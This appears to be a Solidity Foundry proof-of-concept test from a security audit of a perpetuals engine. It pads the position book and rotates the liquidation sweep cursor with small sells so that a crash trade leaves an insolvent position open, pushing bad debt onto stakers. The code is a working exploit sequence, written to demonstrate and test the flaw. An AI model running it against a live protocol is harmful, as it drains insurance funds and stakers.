// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {YBase} from "./YBase.sol";
import {PerpSwapLib} from "../../cauldron/PerpSwapLib.sol";
import {console2} from "forge-std/console2.sol";

/**
 *  R1B — THE PRE-EMPTIVE SWEEP IS A 12-SLOT WINDOW OVER A 64-SLOT BOOK.
 *
 *  PerpEngine.sol:419  `uint256 internal constant SWEEP_SCAN = 12;`
 *  PerpEngine.sol:186  `uint256 internal constant MAX_LIQ_PER_SWAP = 8;`
 *  PerpEngine.sol:198  `uint256 public constant MAX_OPEN_POSITIONS = 64;`
 *  PerpEngine.sol:1126 `while (scanned < SWEEP_SCAN && scanned < len && kills < MAX_LIQ_PER_SWAP)`
 *
 *  Anyone may pad the book with cheap positions (minCollateral = 0.003 ether,
 *  PerpEngine.sol:182). Padding pushes a chosen position outside BOTH the
 *  pre-trade window and the post-trade window of the same swap, so the trade that
 *  bankrupts it is neither pre-empted nor cleaned up, and the gap lands on the
 *  insurance buffer / PLV stakers.
 *
 *  I1 (staker safety): after any single swap, no OPEN position is insolvent at
 *  the realized post-trade price.
 */
contract R1B_SweepWindowStarvation is YBase {
    uint256 internal vid;
    uint256 internal vSize;
    uint256 internal vPrin;

    bool internal ranA;
    bool internal ranB;
    bool internal survivedPadded;
    bool internal insolventPadded;
    uint256 internal gapPadded;
    bool internal survivedBare;
    bool internal insolventBare;

    function setUp() public {
        _boot(60 ether, 0);
        if (!active) return;
        _bootPerp(40 ether, 400_000_000 ether);
    }

    function _tokensFor(uint256 ethAmt) internal view returns (uint256) {
        uint256 v = PerpSwapLib.quoteAt(1e18, uint256(_sqrtP()));
        if (v == 0) return 0;
        return (ethAmt * 1e18) / v;
    }

    function _pad(uint256 n) internal {
        for (uint256 i; i < n; i++) {
            address a = address(uint160(0xD00D0000 + i));
            vm.deal(a, 1 ether);
            vm.prank(a);
            // SHORTS: a crash makes them PROFITABLE, so the sweep never kills them
            // and never swap-pops the tail into the scan window.
            perp.openShort{value: 0.01 ether}(2, 0, 0, 0.01 ether);
        }
    }


    // ---- storage probes (PerpEngine slots: _openIds=78, sweepCursor=80) ----
    function _cursor() internal view returns (uint256) {
        return uint256(vm.load(address(perp), bytes32(uint256(80))));
    }
    function _openLen() internal view returns (uint256) {
        return uint256(vm.load(address(perp), bytes32(uint256(78))));
    }
    function _idxOf(uint256 id) internal view returns (uint256 idx, bool found) {
        uint256 n = _openLen();
        bytes32 base = keccak256(abi.encode(uint256(78)));
        for (uint256 i; i < n; i++) {
            if (uint256(vm.load(address(perp), bytes32(uint256(base) + i))) == id) return (i, true);
        }
        return (0, false);
    }
    /// @dev true when `idx` falls outside BOTH 12-slot windows of one swap.
    function _outsideBothWindows(uint256 idx, uint256 c, uint256 n) internal pure returns (bool) {
        uint256 rel = (idx + n - (c % n)) % n;
        return rel >= 24;
    }
    /// @dev Rotate `sweepCursor` with cheap dust sells until the victim sits
    ///      outside both windows. This is the whole attack: public swaps.
    function _rotateUntilSafe() internal returns (bool ok, uint256 rotations) {
        for (uint256 k; k < 30; k++) {
            (uint256 idx, bool f) = _idxOf(vid);
            if (!f) return (false, k);
            if (_outsideBothWindows(idx, _cursor(), _openLen())) return (true, k);
            uint256 t = _tokensFor(0.02 ether);
            deal(token, attacker, t, true);
            _sell(t, attacker);
            rotations = k + 1;
        }
        return (false, 30);
    }

    function _openVictim() internal {
        vm.prank(victim);
        vid = perp.openLong{value: 1 ether}(2, 0, 0, 1 ether);
        (, , , uint256 s, uint256 p, , , ) = perp.positions(vid);
        vSize = s;
        vPrin = p;
    }

    /// @dev Crash with a big sell; report whether the victim survived the swap
    ///      and, if so, how far under water it is at the REALIZED price.
    function _crash(uint256 ethEq) internal returns (bool survived, bool insolvent, uint256 gap) {
        uint256 tokenIn = _tokensFor(ethEq);
        deal(token, attacker, tokenIn, true);
        _sell(tokenIn, attacker);
        (address t, , , , , , , ) = perp.positions(vid);
        survived = (t != address(0));
        uint256 val = PerpSwapLib.quoteAt(vSize, uint256(_sqrtP()));
        insolvent = val < vPrin;
        gap = insolvent ? vPrin - val : 0;
        console2.log("survived", survived, "insolvent", insolvent);
        console2.log("  valAtRealized", val, "principal", vPrin);
    }

    /// POSITIVE CONTROL: with a SHORT book the pre-emptive sweep works — the
    /// victim is closed before the crash trade and no insolvent position is left
    /// open. This test PASSES.
    function test_R1B_positive_short_book_is_preempted() public {
        if (active) {
            _openVictim();
            (bool s, bool ins, ) = _crash(45 ether);
            survivedBare = s;
            insolventBare = ins;
            ranB = true;
        }
        console2.log("ranB", ranB, "survivedBare", survivedBare);
        assertTrue(ranB, "fork not active");
        assertFalse(survivedBare && insolventBare, "I1 holds on a short book");
    }

    /// ATTACK: 40 cheap padding positions push the victim past both the pre-trade
    /// and post-trade 12-slot windows. This assertion FAILS.
    function test_R1B_padded_book_strands_an_insolvent_position() public {
        if (active) {
            _pad(40);
            _openVictim();
            (bool safe, uint256 rot) = _rotateUntilSafe();
            console2.log("windowSafe", safe, "rotations", rot);
            (bool s, bool ins, uint256 g) = _crash(45 ether);
            survivedPadded = s;
            insolventPadded = ins;
            gapPadded = g;
            ranA = true;
        }
        console2.log("ranA", ranA);
        console2.log("survivedPadded", survivedPadded, "insolventPadded", insolventPadded);
        console2.log("badDebtGapWei", gapPadded);
        assertTrue(ranA, "fork not active - PoC proved nothing");
        assertFalse(
            survivedPadded && insolventPadded,
            "I1 BROKEN: insolvent position still open after the swap that bankrupted it"
        );
    }
}
